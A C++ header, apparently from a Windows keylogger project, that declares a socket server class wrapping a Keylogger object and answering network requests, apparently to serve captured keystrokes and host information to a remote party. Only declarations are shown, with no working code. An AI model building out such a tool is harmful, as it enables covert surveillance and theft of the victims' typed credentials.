#pragma once

#include <iostream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <regex>
#include <winsock2.h>
#include <WS2tcpip.h>

#include "Keylogger.h"
#include "ComputerInfoHelper.h"

#define SOCKET_BUFFER_SIZE 1024

class SocketServer {
private:
	Keylogger* logger;
	SOCKET listenSocket;
public:
	SocketServer(Keylogger* logger);
	void start();
	std::wstring getResponse(std::wstring request);
	std::string getHostName();
};

